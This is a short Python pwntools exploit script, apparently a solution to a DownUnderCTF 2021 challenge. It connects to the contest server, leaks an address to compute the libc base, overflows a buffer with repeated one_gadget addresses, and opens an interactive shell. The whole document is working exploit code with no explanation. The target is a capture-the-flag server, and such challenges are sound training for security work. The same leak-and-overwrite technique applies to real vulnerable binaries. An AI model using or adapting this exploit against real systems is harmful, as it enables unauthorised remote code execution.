from pwn import *

libc_base_diff = 0x7fca425312a0 - 0x7fca42149000

io = remote("pwn-2021.duc.tf", 31909)
#io = remote("localhost", 8000)
io.recv()
io.sendline()

# leak stack address
io.sendline(b"12")
leak = io.recv().decode()
leak = leak.split("\n")[0].split(" ")[-1]
leak = int(leak, 16)

libc_base = leak - libc_base_diff
print(f"[+] libc base: {hex(libc_base)}")

one_gadget = libc_base + 0x4f3d5
#one_gadget = libc_base + 0x4f432
#one_gadget = libc_base + 0x10a41c

payload = (256 // 8) * p64(one_gadget)

# send number of bytes and payload
io.sendline(b"256")
io.sendline(payload)
io.clean()
io.interactive()
